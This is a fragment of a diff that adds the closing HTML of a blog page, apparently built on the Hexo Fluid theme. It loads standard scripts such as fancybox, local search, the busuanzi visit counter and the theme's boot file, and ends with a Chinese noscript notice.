+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
